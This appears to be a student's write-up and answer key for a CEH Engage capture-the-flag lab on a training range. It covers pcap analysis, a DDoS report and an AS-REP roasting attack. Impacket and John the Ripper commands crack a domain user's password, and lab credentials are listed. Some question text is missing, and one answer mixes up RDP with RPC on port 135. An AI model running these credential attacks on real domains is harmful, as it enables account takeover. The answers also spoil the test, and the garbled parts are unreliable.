<h1>Lab: Security Audit</h1>

<h2>Scenario</h2>
<p>You have been hired as a part of the Red Team at CEHORG, an IT and ITES organization that deals with advanced research and development in the field of 
information security. It has offices all over the country connected in real-time by its network infrastructure. Your organization is worried about rising 
cybersecurity incidents and has entrusted you with a comprehensive security audit of the complete infrastructure. </p>
<h2>Infrastructure</h2>
<p>CEHORG’s internal network consists of <b>several subnets</b> housing various organizational units like any large organization. The front office is connected 
to a <b>separate subnet</b> that connects to the company’s public-facing computers. The company has installed multiple kiosks to help customers understand their 
products and services. The front office also has <b>Wi-Fi connectivity</b> to cater to the users who carry their smartphones and laptops.</p>
<p>The CEHORG’s internal network is made up of <b>Militarized and Demilitarized zones</b>. As a security precaution, and by design, all the internal resource 
zones are configured with <b>different subnet IPs</b>. The militarized zone houses the application servers that provide application frameworks for various 
departments. The Demilitarized Zone contains public-facing systems of the organization, such as web and mail servers. The headquarter’s network topology and 
protocols are <b>replicated</b> worldwide in all its satellite offices for easy communication with the headquarters.</p>

<h2>Inventory</h2>
<p>On the cyber range, you will have access to Ethical Hacker Workstations, EH Workstation – 1 and EH Workstation – 2. EH Workstation – 1 is a Windows 11 
machine and EH Workstation – 2 is a Parrot Security machine. You can switch to these machines from the Resources tab.</p>
<p>The credentials to access EH Workstation – 1 (Windows 11) machine are: Username: Admin Password: Pa$$w0rd</p>
<p>The credentials to access EH Workstation – 2 (Parrot Security) are: Username: attacker Password: toor</p>
<p>The credentials to access OpenVAS on EH Workstation – 1 (Parrot Security) machine are: Username: admin Password: password</p>
<p>You can use username.txt and password.txt available on the Desktop of the EH Workstation – 2 (Parrot Security) machine for any <b>credentials/password 
cracking</b> attempt.</p>

<h1>CEH Engage - Part I</h1>
<p>Part 1 of CEH Engage covers Footprinting and Reconnaissance, Scanning Networks, Enumeration, and Vulnerability Analysis modules. In this part, you are 
required to perform passive and active reconnaissance of the target organization, enumerating services, shares, users, user groups, etc., and perform 
vulnerability analysis of the identified systems/networks on the target. You need to note all the information discovered in this part of the CEH Engage and 
proceed to the subsequent phases of the ethical hacking cycle in the next part of the CEH Engage.</p>
<h2>Flags</h2>

    <p>Answer: we get a very important tip -> check for target Destination port</p>
    <p><ol>
        <ul>Open ServerDos.pcapng in wireshark</ul>
        <ul>Double click an interesting row (UDP protocol)</ul>
        <ul>In the UDP datagram we can see the Dest port is 26.000</ul>
        <ul>Some old school OSINT tells us that port 26.000 is used by Quake</ul>
        <ul>It's a kind of hard to find the official name for the protocol Quake uses</ul>
        <ul>Wireshark keeps a list of official protocol names at https://www.wireshark.org/docs/dfref/</ul>
        <ul>The answer for this challenge is <b>Quake Network Protocol</b></ul>
    </ol></p>
<p>Challenge 4:</p>

        is targeting the RPC service of the target machine. (Format: NNN.NN.NN.NN)</p>
    <p>Answer: searching for rdp in wireshark gives no results. It's important to know that RDP makes use of port 135</p>
    <p><ol>
        <ul>Load the pcap file in wireshark</ul>
        <ul>search for tcp.dstport == 135</ul>
        <ul>answer to this challenge is 172.30.10.99</ul>
    </ol></p>
<p>Challenge 6:</p>
    <p>An incident handler identified severe DDoS attack on a network and provided report using Anti-DDoS Guardian tool. You are assigned to analyse the 
        reports submitted by the IH team which are stored in "C:\Users\Admin\Documents\Anti-DDoS" directory of the EH Workstation-1 and determine the attacker 
        IP which has transmitted more number of packets to the target machine. (Format: NNN.NNN.NN.NNN)</p>
    <p>Answer: there is only one report text file. This file contains delimited values and can be opened in Excel. I opened this file in Excel and converted 
    it into a Table. We can see that IP <b>192.168.10.222</b> has sent a large amount of packets to the target machine.</p>
<p>Challenge 7:</p>
<p>You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the 
    password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while 
    cracking the credentials. (Format: aNaaN*NNN)</p>
    <p>Answer: I created a <a href=cookbook/active_directory_attacks.html>recipe</a> for AS-REP roasting attack.</p>
    <p>An AS-REP roasting attack targets user accounts in AD that do not require Kerberos pre-authentication, exploiting the DONT_REQ_PREAUTH setting. 
        Attackers can request a ticket-granting ticket (TGT) for these accounts without needing the user's password. The DC responds with an encrypted TGT, 
        which the attacker captures. This TGT, encrypted with the user's password hash, is then subjected to offline password-cracking tools such as 
        Hashcat or John the Ripper. By rapidly guessing the password, the attacker can eventually decrypt the TGT, revealing the user's password.</p>
    <p><ol>
        <ul>In Workstation - 2 start console</ul>
        <ul>Impacket's GetNPUsers.py seems to be available in /usr/local/bin</ul>

        <ul>python3 GetNPUsers.py SKILL.CEH/  -no-pass -usersfile /home/attacker/users.txt -dc-ip 192.168.0.222</ul>
        <ul>We can observe users who have DONT_REQUIRE_PREAUTH set. As these users are vulnerable to AS-REP roasting, we can obtain their passwords</ul>
        <ul>copy the hash</ul>
        <ul>echo [paste the hash] > /home/attacker/asrephash.txt</ul>
        <ul>john wordlist=/home/attacker/rockyou.txt /home/attacker/asrephash.txt</ul>
        <ul>The password of user Joshua is <b>c3ll0@123</b></ul>
    </ol></p>
